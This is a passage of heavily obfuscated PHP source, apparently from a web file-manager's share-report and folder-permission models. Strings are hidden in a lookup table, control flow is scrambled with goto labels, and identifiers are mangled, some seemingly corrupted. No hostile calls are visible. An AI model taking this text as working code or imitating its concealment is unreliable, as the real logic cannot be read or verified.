($f”©‚º‹‡[$A‡•ï…¶¹[697]]) { $C‚Ö•ÈŸ·³ = $f”©‚º‹‡[$A‡•ï…¶¹[460]] ? $f”©‚º‹‡[$A‡•ï…¶¹[460]] : strtotime(date($A‡•ï…¶¹[2250])); $BÓùÕ—êå[$A‡•ï…¶¹[199]] = array($A‡•ï…¶¹[332], array($f”©‚º‹‡[$A‡•ï…¶¹[697]], $C‚Ö•ÈŸ·³)); } if ($f”©‚º‹‡[$A‡•ï…¶¹[39]]) { $BÓùÕ—êå[$f”©‚º‹‡[$A‡•ï…¶¹[39]]] = 1; } else { $BÓùÕ—êå[] = array($A‡•ï…¶¹[457] => array($A‡•ï…¶¹[916], 0), $A‡•ï…¶¹[459] => array($A‡•ï…¶¹[916], 0), $A‡•ï…¶¹[2226] => $A‡•ï…¶¹[2183]); } if ($f”©‚º‹‡[$A‡•ï…¶¹[2179]]) { $BÓùÕ—êå[] = array($A‡•ï…¶¹[454] => $f”©‚º‹‡[$A‡•ï…¶¹[2179]], $A‡•ï…¶¹[1332] => array($A‡•ï…¶¹[746], "\45{$f”©‚º‹‡[$A‡•ï…¶¹[2179]]}\45"), $A‡•ï…¶¹[2226] => $A‡•ï…¶¹[2183]); } goto A—”“èìÄ; cª›£ĞÚ¿: return $E©ÇˆŠ¸”; goto e²Ğ­ ôÉÏ; e²Ğ­ ôÉÏ: } public function listDataApply($dºõ²¶ì‡‹) { $this->_listDataApply($dºõ²¶ì‡‹); return $dºõ²¶ì‡‹; } private function _listDataApply(&$e©ª‘Ìã¹È) { $A”İÍ¨ â =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÀ¶¾óÅßå = array_to_keyvalue($e©ª‘Ìã¹È, $A”İÍ¨ â[43], $A”İÍ¨ â[1427]); $e‹„ò¢êÈÓ = Model($A”İÍ¨ â[490])->userListInfo(array_unique($eÀ¶¾óÅßå)); $bä«ø«°­‘ = array_to_keyvalue($e©ª‘Ìã¹È, $A”İÍ¨ â[43], $A”İÍ¨ â[380]); $f‹âº­¯» = Model($A”İÍ¨ â[747])->sourceListInfo($bä«ø«°­‘, !0); foreach ($e©ª‘Ìã¹È as &$Dò„»ßîÛö) { $c‹Çæè¬–• = $Dò„»ßîÛö[$A”İÍ¨ â[1427]]; $Dò„»ßîÛö[$A”İÍ¨ â[2251]] = $e‹„ò¢êÈÓ[$c‹Çæè¬–•] ? $e‹„ò¢êÈÓ[$c‹Çæè¬–•] : !1; $cÛ‚¥˜Ç¹ï = $Dò„»ßîÛö[$A”İÍ¨ â[380]]; $Dò„»ßîÛö[$A”İÍ¨ â[402]] = $f‹âº­¯»[$cÛ‚¥˜Ç¹ï] ? $f‹âº­¯»[$cÛ‚¥˜Ç¹ï] : !1; } } private function _makeOrder($dŠÃì‚ÅµË = '') { goto aæÀÁƒêå÷; fö¶™‹¤Ä’: $b¢Í­¦æÉ = Input::get($AŠ¤™³Ïš[418], $AŠ¤™³Ïš[17], $AŠ¤™³Ïš[400], $dåçõµ¿˜ë); $DÏ›¤•©›“ = Input::get($AŠ¤™³Ïš[419], $AŠ¤™³Ïš[17], $AŠ¤™³Ïš[2252], array($AŠ¤™³Ïš[2178], $AŠ¤™³Ïš[415])); $DÏ›¤•©›“ = $FõÓ¡£àëµ[$DÏ›¤•©›“]; goto c‡¬ƒÅö±¦; c‡¬ƒÅö±¦: $dŠÃì‚ÅµË = $dŠÃì‚ÅµË . "{$b¢Í­¦æÉ}\40{$DÏ›¤•©›“}"; return $this->order($dŠÃì‚ÅµË); goto Eó‡í­â˜; aæÀÁƒêå÷: $AŠ¤™³Ïš =& $_SERVER[¹÷ˆ§éÒ°ú]; $dåçõµ¿˜ë = array($AŠ¤™³Ïš[199], $AŠ¤™³Ïš[460], $AŠ¤™³Ïš[2238], $AŠ¤™³Ïš[2239]); $FõÓ¡£àëµ = array($AŠ¤™³Ïš[413] => $AŠ¤™³Ïš[414], $AŠ¤™³Ïš[415] => $AŠ¤™³Ïš[416]); goto fö¶™‹¤Ä’; Eó‡í­â˜: } public function reportAdd($f¹„¼Î¼Ê‹) { $a‰»¶­Èñ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D‰‹£†Åå§ = array($a‰»¶­Èñ[452] => $f¹„¼Î¼Ê‹[$a‰»¶­Èñ[452]], $a‰»¶­Èñ[1427] => USER_ID); if (Model($a‰»¶­Èñ[2248])->where($D‰‹£†Åå§)->find()) { return !1; } $F‚ÄÏõâ±× = array($a‰»¶­Èñ[452] => $f¹„¼Î¼Ê‹[$a‰»¶­Èñ[452]], $a‰»¶­Èñ[1332] => $f¹„¼Î¼Ê‹[$a‰»¶­Èñ[1332]], $a‰»¶­Èñ[380] => $f¹„¼Î¼Ê‹[$a‰»¶­Èñ[380]], $a‰»¶­Èñ[430] => $f¹„¼Î¼Ê‹[$a‰»¶­Èñ[430]], $a‰»¶­Èñ[1427] => USER_ID, $a‰»¶­Èñ[39] => $f¹„¼Î¼Ê‹[$a‰»¶­Èñ[39]], $a‰»¶­Èñ[416] => $f¹„¼Î¼Ê‹[$a‰»¶­Èñ[416]]); return Model($a‰»¶­Èñ[2248])->add($F‚ÄÏõâ±×); } public function reportList($c¼î¶ ×ä) { goto C³Æõµ™ì; Câ½©¾õÈÃ: if (isset($c¼î¶ ×ä[$FáùØÛ½¢ë[39]]) && in_array($c¼î¶ ×ä[$FáùØÛ½¢ë[39]], array($FáùØÛ½¢ë[95], $FáùØÛ½¢ë[2253], $FáùØÛ½¢ë[2254], $FáùØÛ½¢ë[2255], $FáùØÛ½¢ë[1913]))) { $aŠ’“±æ™Š[$FáùØÛ½¢ë[39]] = $c¼î¶ ×ä[$FáùØÛ½¢ë[39]]; } if (isset($c¼î¶ ×ä[$FáùØÛ½¢ë[684]]) && in_array($c¼î¶ ×ä[$FáùØÛ½¢ë[684]], array($FáùØÛ½¢ë[481], $FáùØÛ½¢ë[95], $FáùØÛ½¢ë[2253], $FáùØÛ½¢ë[2254]))) { $aŠ’“±æ™Š[$FáùØÛ½¢ë[684]] = $c¼î¶ ×ä[$FáùØÛ½¢ë[684]]; } $Fîªß¨´¦ï = Input::get($FáùØÛ½¢ë[419], $FáùØÛ½¢ë[17], $FáùØÛ½¢ë[2252], array($FáùØÛ½¢ë[2178], $FáùØÛ½¢ë[415])); goto dÎÑìÓØ´´; B‘Ş³è¸Š: if (empty($BÈÃô×Ò°[$FáùØÛ½¢ë[365]])) { return array(); } $this->_listDataApply($BÈÃô×Ò°[$FáùØÛ½¢ë[365]]); return $BÈÃô×Ò°; goto EéÓôì×ÈÊ; dÎÑìÓØ´´: $C–Å¦ƒöÍƒ = array($FáùØÛ½¢ë[413] => $FáùØÛ½¢ë[414], $FáùØÛ½¢ë[415] => $FáùØÛ½¢ë[416]); $bÁÉãÈ†¹ = $FáùØÛ½¢ë[2256] . $C–Å¦ƒöÍƒ[$Fîªß¨´¦ï]; $BÈÃô×Ò° = Model($FáùØÛ½¢ë[2248])->where($aŠ’“±æ™Š)->order($bÁÉãÈ†¹)->selectPage(20); goto B‘Ş³è¸Š; C³Æõµ™ì: $FáùØÛ½¢ë =& $_SERVER[¹÷ˆ§éÒ°ú]; $aŠ’“±æ™Š = array(); if ($c¼î¶ ×ä[$FáùØÛ½¢ë[697]]) { $B‰¨Š››«ß = $c¼î¶ ×ä[$FáùØÛ½¢ë[460]] ? $c¼î¶ ×ä[$FáùØÛ½¢ë[460]] : strtotime(date($FáùØÛ½¢ë[2250])); $aŠ’“±æ™Š[$FáùØÛ½¢ë[199]] = array($FáùØÛ½¢ë[332], array($c¼î¶ ×ä[$FáùØÛ½¢ë[697]], $B‰¨Š››«ß)); } goto Câ½©¾õÈÃ; EéÓôì×ÈÊ: } public function reportStatus($F¥Â¬’›¹Å) { goto dõ‡ôæ…Ê; a“Ñ×Á‰Õ: $a½¬ì¹ä‹ = Model($aÎÂç‹‘‡[2248])->where($C„ƒ×¨©•÷)->save($Dºà„Ò); if ($F¥Â¬’›¹Å[$aÎÂç‹‘‡[684]] == $aÎÂç‹‘‡[2253]) { if ($aÒ…îÎ¥³[$aÎÂç‹‘‡[430]] != $aÎÂç‹‘‡[481] && $this->shareFileMeta($aÒ…îÎ¥³[$aÎÂç‹‘‡[430]])) { $this->shareFileMeta($aÒ…îÎ¥³[$aÎÂç‹‘‡[430]], 0); } $this->remove($aÒ…îÎ¥³[$aÎÂç‹‘‡[452]]); return !0; } if ($a½¬ì¹ä‹ && $F¥Â¬’›¹Å[$aÎÂç‹‘‡[684]] == $aÎÂç‹‘‡[2254]) { $C‡ğ»ŒÈ¿ = $Dºà„Ò[$aÎÂç‹‘‡[684]] == $aÎÂç‹‘‡[2254] ? 1 : 0; $this->shareFileMeta($aÒ…îÎ¥³[$aÎÂç‹‘‡[430]], $C‡ğ»ŒÈ¿); $this->removeByFile($aÒ…îÎ¥³[$aÎÂç‹‘‡[430]]); } goto bÕÉ›Ô­„Ü; bÕÉ›Ô­„Ü: return $a½¬ì¹ä‹; goto fŒ³Šğ…Ğ; A°äôß‘¥°: if (!$aÒ…îÎ¥³) { return !1; } $Dºà„Ò = array($aÎÂç‹‘‡[684] => $F¥Â¬’›¹Å[$aÎÂç‹‘‡[684]]); if ($F¥Â¬’›¹Å[$aÎÂç‹‘‡[684]] == $aÎÂç‹‘‡[2254] && $aÒ…îÎ¥³[$aÎÂç‹‘‡[684]] == $aÎÂç‹‘‡[2254]) { $Dºà„Ò[$aÎÂç‹‘‡[684]] = 0; } goto a“Ñ×Á‰Õ; dõ‡ôæ…Ê: $aÎÂç‹‘‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C„ƒ×¨©•÷ = array($aÎÂç‹‘‡[378] => $F¥Â¬’›¹Å[$aÎÂç‹‘‡[378]]); $aÒ…îÎ¥³ = Model($aÎÂç‹‘‡[2248])->where($C„ƒ×¨©•÷)->field($aÎÂç‹‘‡[2257])->find(); goto A°äôß‘¥°; fŒ³Šğ…Ğ: } private function removeByFile($FÂ¸“ªµ²ç) { goto c–•ó¢¾ì—; c–•ó¢¾ì—: $Bßè”„Ç‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $DíÈ…ºƒÄ‹ = Model($Bßè”„Ç‹[747])->where(array($Bßè”„Ç‹[430] => $FÂ¸“ªµ²ç))->field($Bßè”„Ç‹[380])->select(); $EÉ³»ø—¦Ï = array_to_keyvalue($DíÈ…ºƒÄ‹, $Bßè”„Ç‹[43], $Bßè”„Ç‹[380]); goto bá™ÂÎÏù; bá™ÂÎÏù: $CáåÙÉ‹˜ã = array($Bßè”„Ç‹[380] => array($Bßè”„Ç‹[17], $EÉ³»ø—¦Ï), $Bßè”„Ç‹[457] => 1); $DíÈ…ºƒÄ‹ = Model($Bßè”„Ç‹[2075])->where($CáåÙÉ‹˜ã)->field($Bßè”„Ç‹[452])->select(); if (empty($DíÈ…ºƒÄ‹)) { return; } goto aøò¡ÑëŒ; aøò¡ÑëŒ: $fİØ¦•Ó¡ = array_to_keyvalue($DíÈ…ºƒÄ‹, $Bßè”„Ç‹[43], $Bßè”„Ç‹[452]); $this->remove($fİØ¦•Ó¡); goto FÀŒõ›¦¢÷; FÀŒõ›¦¢÷: } private function shareFileMeta($eÓ•Â·‘¨˜, $e†½÷—¿æà = null) { $CÚª¾Ê¿¨µ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÖğÅŠ¥ùï = array($CÚª¾Ê¿¨µ[430] => $eÓ•Â·‘¨˜, $CÚª¾Ê¿¨µ[101] => $CÚª¾Ê¿¨µ[2258]); if (is_null($e†½÷—¿æà)) { return Model($CÚª¾Ê¿¨µ[2259])->where($dÖğÅŠ¥ùï)->find(); } $dÖğÅŠ¥ùï[$CÚª¾Ê¿¨µ[370]] = $e†½÷—¿æà; Model($CÚª¾Ê¿¨µ[2259])->add($dÖğÅŠ¥ùï, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\143\145\x5f\141\x75\164\150"; public function getAuth($bâ–‰±ñ¤) { goto EÃÌéöª±; DÔ´¾ æ›à: return $AğÂ’‘ Ó­; goto DÆ’Š·µßÕ; EÃÌéöª±: $aè İ¡­Î£ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D§†‘ºÕ„ì = $aè İ¡­Î£[2260]; $BòÕİß–Öø = array($aè İ¡­Î£[380] => $bâ–‰±ñ¤); goto fŸØ¯ŠØÎÙ; fŸØ¯ŠØÎÙ: $f•¬óÀÄ”Î = $this->field($D§†‘ºÕ„ì)->order($aè İ¡­Î£[378])->where($BòÕİß–Öø)->select(); $AğÂ’‘ Ó­ = array(); foreach ($f•¬óÀÄ”Î as $CºßÏéÃÒô) { if (Model($aè İ¡­Î£[2261])->listData($CºßÏéÃÒô[$aè İ¡­Î£[2242]])) { $AğÂ’‘ Ó­[] = $CºßÏéÃÒô; } } goto DÔ´¾ æ›à; DÆ’Š·µßÕ: } public function setAuth($AÇ§§ëŞ˜­, $A‰§ê›èÉ‡) { goto E•ÙÜñ™šŠ; E•ÙÜñ™šŠ: $aùÚ˜ÊÖÎí =& $_SERVER[¹÷ˆ§éÒ°ú]; $F»†Ó¥¤–Æ = Model($aùÚ˜ÊÖÎí[1108])->sourceInfo($AÇ§§ëŞ˜­); if ($F»†Ó¥¤–Æ[$aùÚ˜ÊÖÎí[382]] != SourceModel::TYPE_GROUP) { return !1; } goto e„¢åó§²Â; f”Ò¹²‚›»: $aÊ×ÏÄÕˆ¶ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $b ¤–‹ç“ƒ = array(); foreach ($A‰§ê›èÉ‡ as $EôêÁŞÑÛ¤) { if (!in_array($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[382]], $aÊ×ÏÄÕˆ¶)) { show_json(LNG($aùÚ˜ÊÖÎí[2262]), !1); } if ($F„½ù­¿Š != $e“‘¦£Íùæ) { if ($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[382]] == SourceModel::TYPE_GROUP) { } if ($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[469]] != 0 && !in_array($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[469]], $dØîê¼ŞÌ)) { } } if ($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[469]] == 0) { $EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[382]] = SourceModel::TYPE_USER; } $b ¤–‹ç“ƒ[] = array($aùÚ˜ÊÖÎí[380] => $AÇ§§ëŞ˜­, $aùÚ˜ÊÖÎí[382] => intval($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[382]]), $aùÚ˜ÊÖÎí[469] => intval($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[469]]), $aùÚ˜ÊÖÎí[2242] => intval($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[2242]]) ? intval($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[2242]]) : 0, $aùÚ˜ÊÖÎí[2243] => intval($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[2243]]) ? intval($EôêÁŞÑÛ¤[$aùÚ˜ÊÖÎí[2243]]) : -1); } goto DÛ¥£É‰œÕ; DÛ¥£É‰œÕ: $this->where(array($aùÚ˜ÊÖÎí[394] => $AÇ§§ëŞ˜­))->delete(); $this->addAll($b ¤–‹ç“ƒ); return !0; goto CìÚ¬Ø¢ë¥; e„¢åó§²Â: $e“‘¦£Íùæ = 1; $F„½ù­¿Š = $F»†Ó¥¤–Æ[$aùÚ˜ÊÖÎí[469]]; if ($F„½ù­¿Š != $e“‘¦£Íùæ) { $D÷Œ’…îÑ = array($aùÚ˜ÊÖÎí[2098] => $F„½ù­¿Š); $dØîê¼ŞÌ = Model($aùÚ˜ÊÖÎí[2177])->field($aùÚ˜ÊÖÎí[1427])->where($D÷Œ’…îÑ)->select(); $dØîê¼ŞÌ = array_to_keyvalue($dØîê¼ŞÌ, $aùÚ˜ÊÖÎí[43], $aùÚ˜ÊÖÎí[1427]); } goto f”Ò¹²‚›»; CìÚ¬Ø¢ë¥: } public function authClear($AÂ‡‡å‹Ë) { $fÄßÓ„ˆí¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e§­éÇ˜öË = Model($fÄßÓ„ˆí¦[1108])->sourceInfo($AÂ‡‡å‹Ë); $A¡ŠØ‹Ø•• = array($AÂ‡‡å‹Ë); if ($e§­éÇ˜öË[$fÄßÓ„ˆí¦[381]] == $fÄßÓ„ˆí¦[95]) { $eÃ¶„¸èæ¡ = array($fÄßÓ„ˆí¦[538] => array($fÄßÓ„ˆí¦[496], $e§­éÇ˜öË[$fÄßÓ„ˆí¦[472]] . $AÂ‡‡å‹Ë . $fÄßÓ„ˆí¦[497])); $A¡ŠØ‹Ø•• = Model($fÄßÓ„ˆí¦[1108])->field($fÄßÓ„ˆí¦[394])->where($eÃ¶„¸èæ¡)->getField($fÄßÓ„ˆí¦[380], !0); $A¡ŠØ‹Ø••[] = $AÂ‡‡å‹Ë; } $this->where(array($fÄßÓ„ˆí¦[394] => array($fÄßÓ„ˆí¦[395], $A¡ŠØ‹Ø••)))->delete(); return !0; } public function get($DÓ­ËÑˆŠß) { $fÓ´¤âéÉ = $this->getSourceList(array($DÓ­ËÑˆŠß), !0); return $fÓ´¤âéÉ[0]; } public function getSourceList($BÆî™à‰¯, $eä„É˜áË´ = false) { goto eÍ˜‡øŒ¯©; Aù¬ğõÊçá: $FµöÙ”·Ñ” = array(); foreach ($eä„É˜áË´ as $bïôÕ¡†âÖ => $E“õÃĞã¹¥) { $FµöÙ”·Ñ”[$bïôÕ¡†âÖ] = $this->makeSourceAuth($E“õÃĞã¹¥, $d·Ö´°¬±Ô); } return $FµöÙ”·Ñ”; goto cÁêˆËœ®¾; eÍ˜‡øŒ¯©: $c¶ÒÏ¡íñ¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$BÆî™à‰¯) { return array(); } $bÜé—ø•È = Model($c¶ÒÏ¡íñ¡[1108]); goto e¬ÖØÆá‰º; E¡«£³ö˜‘: $Aå¡´ºùÛ‹ = array_values(array_unique($Aå¡´ºùÛ‹)); if (!$Aå¡´ºùÛ‹) { return array(); } $eÉ©¡å ó = $c¶ÒÏ¡íñ¡[2264]; goto eâ¨ôİ·é; eâ¨ôİ·é: $D‘†¾ÅÓ¯ = array($c¶ÒÏ¡íñ¡[394] => array($c¶ÒÏ¡íñ¡[395], $Aå¡´ºùÛ‹)); $d·Ö´°¬±Ô = $this->field($eÉ©¡å ó)->where($D‘†¾ÅÓ¯)->select(); $d·Ö´°¬±Ô = array_to_keyvalue_group($d·Ö´°¬±Ô, $c¶ÒÏ¡íñ¡[380]); goto Aù¬ğõÊçá; e¬ÖØÆá‰º: if (!$eä„É˜áË´) { $D‘†¾ÅÓ¯ = array($c¶ÒÏ¡íñ¡[394] => array($c¶ÒÏ¡íñ¡[395], $BÆî™à‰¯)); $eä„É˜áË´ = $bÜé—ø•È->field($c¶ÒÏ¡íñ¡[2263])->where($D‘†¾ÅÓ¯)->select(); $eä„É˜áË´ = array_to_keyvalue($eä„É˜áË´, $c¶ÒÏ¡íñ¡[380]); } $Aå¡´ºùÛ‹ = $BÆî™à‰¯; foreach ($eä„É˜áË´ as $d°æÒÀ˜ù => $Dáˆè§Ïç¨) { $eÉ¡¸ã†Ö = $bÜé—ø•È->parentLevelArray($Dáˆè§Ïç¨[$c¶ÒÏ¡íñ¡[472]]); $Aå¡´ºùÛ‹ = array_merge($Aå¡´ºùÛ‹, $eÉ¡¸ã†Ö, array($d°æÒÀ˜ù)); } goto E¡«£³ö˜‘; cÁêˆËœ®¾: } public function authDeepCheck($e‰¸÷‘ï‚ã) { goto e¦•÷Ë“ó¥; B›ïŒ¸–: $Cƒ·ĞÈ«šµ = $A©ÂƒŒï­Ú ? $A©ÂƒŒï­Ú[0] : $e‰¸÷‘ï‚ã; return array($a÷Ä‡Üµ¶[388] => -1, $a÷Ä‡Üµ¶[429] => array($a÷Ä‡Üµ¶[396] => $a÷Ä‡Üµ¶[1022], $a÷Ä‡Üµ¶[2104] => $a÷Ä‡Üµ¶[481], $a÷Ä‡Üµ¶[397] => LNG($a÷Ä‡Üµ¶[2267]), $a÷Ä‡Üµ¶[2116] => $a÷Ä‡Üµ¶[2268]), $a÷Ä‡Üµ¶[2269] => array($a÷Ä‡Üµ¶[399] => $a÷Ä‡Üµ¶[2270], $a÷Ä‡Üµ¶[87] => $Cƒ·ĞÈ«šµ)); goto A¶•œø•İè; e¦•÷Ë“ó¥: $a÷Ä‡Üµ¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (_get($GLOBALS, $a÷Ä‡Üµ¶[470])) { return !1; } $eƒóƒ˜½Å = $this->makeAuthDeep(); goto B¾Ïæô‹´; B¾Ïæô‹´: if (!in_array($e‰¸÷‘ï‚ã, $eƒóƒ˜½Å[$a÷Ä‡Üµ¶[2265]])) { return !1; } $A©ÂƒŒï­Ú = array(); foreach ($eƒóƒ˜½Å[$a÷Ä‡Üµ¶[2266]] as $a½ù›­ì¡¦ => $eœó‘›Û) { if (!in_array($e‰¸÷‘ï‚ã, $eœó‘›Û)) { continue; } $A©ÂƒŒï­Ú[] = $a½ù›­ì¡¦; } goto B›ïŒ¸–; A¶•œø•İè: } protected function makeAuthDeep() { goto E×ºÑŠ¡°; aÂïƒ”â: foreach ($dØî•è‹¹˜ as $cš½œÏÍŠ‹) { $C¥Æ¶ÓÀ‘ = $A›âØù«À->getInfo($cš½œÏÍŠ‹); $a’ï×¢Äù“ = $Eîì¡¸Ì—->parentLevelArray($C¥Æ¶ÓÀ‘[$dŒ¡“¶ë¡™[472]]); $EšÊ­öÉ¦á = array_merge($EšÊ­öÉ¦á, $a’ï×¢Äù“); } $EšÊ­öÉ¦á = array_values(array_unique($EšÊ­öÉ¦á)); foreach ($EšÊ­öÉ¦á as $cš½œÏÍŠ‹) { $C¥Æ¶ÓÀ‘ = $A›âØù«À->getInfo($cš½œÏÍŠ‹); $BÉó‘ÜÁ§[] = $C¥Æ¶ÓÀ‘[$dŒ¡“¶ë¡™[402]][$dŒ¡“¶ë¡™[380]]; $còŞö‘ùŸ[$cš½œÏÍŠ‹] = $C¥Æ¶ÓÀ‘[$dŒ¡“¶ë¡™[402]][$dŒ¡“¶ë¡™[380]]; $DÔœœ —Õ[$cš½œÏÍŠ‹] = $Eîì¡¸Ì—->parentLevelArray($C¥Æ¶ÓÀ‘[$dŒ¡“¶ë¡™[472]]); } goto B¨ŞÒô„Â; E×ºÑŠ¡°: $dŒ¡“¶ë¡™ =& $_SERVER[¹÷ˆ§éÒ°ú]; static $D”Ç®ëîƒ¾ = false; if ($D”Ç®ëîƒ¾) { return $D”Ç®ëîƒ¾; } goto Cô¨½ÉËŸ; dÂàôô„ƒ†: if ($aó¯ö¹£Öâ) { $EáÍˆ…ˆì‹ = $Eîì¡¸Ì—->where(array($dŒ¡“¶ë¡™[380] => array($dŒ¡“¶ë¡™[395], $aó¯ö¹£Öâ)))->select(); foreach ($EáÍˆ…ˆì‹ as $B•§¡àÉ¸¶) { $a’ï×¢Äù“ = $Eîì¡¸Ì—->parentLevelArray($B•§¡àÉ¸¶[$dŒ¡“¶ë¡™[472]]); $BÉó‘ÜÁ§ = array_merge($BÉó‘ÜÁ§, $a’ï×¢Äù“); $EšÊ­öÉ¦á[] = $B•§¡àÉ¸¶[$dŒ¡“¶ë¡™[469]]; $aÖ¾¹¡éÙ·[$B•§¡àÉ¸¶[$dŒ¡“¶ë¡™[380]]] = $a’ï×¢Äù“; $F‰Ş›øµ[$B•§¡àÉ¸¶[$dŒ¡“¶ë¡™[380]]] = $B•§¡àÉ¸¶[$dŒ¡“¶ë¡™[469]]; } } $EšÊ­öÉ¦á = array_values(array_unique($EšÊ­öÉ¦á)); $dØî•è‹¹˜ = $EšÊ­öÉ¦á; goto aÂïƒ”â; BõÙ÷Ñ–£Ó: $aó¯ö¹£Öâ = array_to_keyvalue($F¿âÛŞÆ“, $dŒ¡“¶ë¡™[43], $dŒ¡“¶ë¡™[380]); $BÉó‘ÜÁ§ = array(); $EšÊ­öÉ¦á = $cŒÂ¹ÈÆçå; goto eÙô•¦ä; bĞ½˜‰±‚ï: return $D”Ç®ëîƒ¾; goto bµÆ¬˜¨á; f‘†«œåÑë: $cŒÂ¹ÈÆçå = Session::get($dŒ¡“¶ë¡™[2227]); $cŒÂ¹ÈÆçå = array_to_keyvalue($cŒÂ¹ÈÆçå, $dŒ¡“¶ë¡™[43], $dŒ¡“¶ë¡™[2098]); $eõÕ¼ÅãŸ = array($dŒ¡“¶ë¡™[382] => SourceModel::TYPE_USER, $dŒ¡“¶ë¡™[469] => USER_ID); goto aÉæ³ä Ä; e’ÊÓ°í›: $F‰Ş›øµ = array(); $còŞö‘ùŸ = array(); $DÔœœ —Õ = array(); goto dÂàôô„ƒ†; B¨ŞÒô„Â: foreach ($aÖ¾¹¡éÙ· as $cÔ„òÁÖÍ¶ => $bƒæâîŒÊ—) { $f‹’é—¥„š = $F‰Ş›øµ[$cÔ„òÁÖÍ¶]; if (!$f‹’é—¥„š || !$còŞö‘ùŸ[$f‹’é—¥„š]) { continue; } $eªê„ÄàÔ½ = array(); foreach ($DÔœœ —Õ[$f‹’é—¥„š] as $cš½œÏÍŠ‹) { $eªê„ÄàÔ½[] = $còŞö‘ùŸ[$cš½œÏÍŠ‹]; } $aÖ¾¹¡éÙ·[$cÔ„òÁÖÍ¶] = array_merge($eªê„ÄàÔ½, $bƒæâîŒÊ—); } $BÉó‘ÜÁ§ = array_values(array_unique($BÉó‘ÜÁ§)); $D”Ç®ëîƒ¾ = array($dŒ¡“¶ë¡™[2265] => $BÉó‘ÜÁ§, $dŒ¡“¶ë¡™[2266] => $aÖ¾¹¡éÙ·); goto bĞ½˜‰±‚ï; Cô¨½ÉËŸ: $F¤Á†¹Ò¦Ä = Model($dŒ¡“¶ë¡™[2271])->listData(); $Cò‚·£¸ = array(); foreach ($F¤Á†¹Ò¦Ä as $eßáœ®ñÑ) { if ($eßáœ®ñÑ[$dŒ¡“¶ë¡™[387]] == 0 && $eßáœ®ñÑ[$dŒ¡“¶ë¡™[2118]] == $dŒ¡“¶ë¡™[95]) { $Cò‚·£¸[] = $eßáœ®ñÑ[$dŒ¡“¶ë¡™[378]]; } } goto f‘†«œåÑë; aÉæ³ä Ä: if ($cŒÂ¹ÈÆçå) { $eõÕ¼ÅãŸ = array(array($dŒ¡“¶ë¡™[382] => SourceModel::TYPE_USER, $dŒ¡“¶ë¡™[469] => USER_ID), array($dŒ¡“¶ë¡™[382] => SourceModel::TYPE_GROUP, $dŒ¡“¶ë¡™[469] => array($dŒ¡“¶ë¡™[395], $cŒÂ¹ÈÆçå)), $dŒ¡“¶ë¡™[904] => $dŒ¡“¶ë¡™[2183]); } if ($Cò‚·£¸) { $eõÕ¼ÅãŸ = array($eõÕ¼ÅãŸ, $dŒ¡“¶ë¡™[2242] => array($dŒ¡“¶ë¡™[2272], $Cò‚·£¸)); } $F¿âÛŞÆ“ = $this->field($dŒ¡“¶ë¡™[2273])->where($eõÕ¼ÅãŸ)->select(); goto BõÙ÷Ñ–£Ó; eÙô•¦ä: $Eîì¡¸Ì— = Model($dŒ¡“¶ë¡™[1108]); $A›âØù«À = Model($dŒ¡“¶ë¡™[471]); $aÖ¾¹¡éÙ· = array(); goto e’ÊÓ°í›; bµÆ¬˜¨á: } private function makeSourceAuth($AÌ‚ç’†¦, $b°›«ÔÈã¸) { goto EÌåö®½¹; EŞöùïÆß: if (!$A’¨áß²‡ && isset($A”ÕĞ¼ø–[$có—‘‰ßŒ‚])) { $f×ÑÎ½„Şâ = $A”ÕĞ¼ø–[$có—‘‰ßŒ‚]; $f“­‰¦œÊ = Model($a”µÊÌêÉ[471])->getInfo($có—‘‰ßŒ‚); $A’¨áß²‡ = array($a”µÊÌêÉ[2274] => intval($f×ÑÎ½„Şâ[$a”µÊÌêÉ[387]][$a”µÊÌêÉ[387]]), $a”µÊÌêÉ[2275] => $f×ÑÎ½„Şâ[$a”µÊÌêÉ[387]], $a”µÊÌêÉ[2269] => array($a”µÊÌêÉ[399] => $a”µÊÌêÉ[2279], $a”µÊÌêÉ[87] => $f“­‰¦œÊ[$a”µÊÌêÉ[402]][$a”µÊÌêÉ[380]], $a”µÊÌêÉ[2278] => $f“­‰¦œÊ[$a”µÊÌêÉ[476]])); } if (!$A’¨áß²‡) { $f“­‰¦œÊ = Model($a”µÊÌêÉ[471])->getInfo($có—‘‰ßŒ‚); $aô¸¾²ÜÅ‘ = explode($a”µÊÌêÉ[57], trim($f“­‰¦œÊ[$a”µÊÌêÉ[472]], $a”µÊÌêÉ[57])); foreach ($aô¸¾²ÜÅ‘ as $dÅÁ­¾ùïŠ) { if ($dÅÁ­¾ùïŠ == $a”µÊÌêÉ[481] || $dÅÁ­¾ùïŠ == $c¿äÖƒ‡†) { continue; } if (!isset($A”ÕĞ¼ø–[$dÅÁ­¾ùïŠ])) { continue; } $f×ÑÎ½„Şâ = $A”ÕĞ¼ø–[$dÅÁ­¾ùïŠ]; $A’¨áß²‡ = array($a”µÊÌêÉ[2274] => intval($f×ÑÎ½„Şâ[$a”µÊÌêÉ[387]][$a”µÊÌêÉ[387]]), $a”µÊÌêÉ[2275] => $f×ÑÎ½„Şâ[$a”µÊÌêÉ[387]], $a”µÊÌêÉ[2269] => array($a”µÊÌêÉ[399] => $a”µÊÌêÉ[2276], $a”µÊÌêÉ[2277] => $f“­‰¦œÊ[$a”µÊÌêÉ[402]][$a”µÊÌêÉ[380]], $a”µÊÌêÉ[2278] => $f“­‰¦œÊ[$a”µÊÌêÉ[476]])); break; } } if 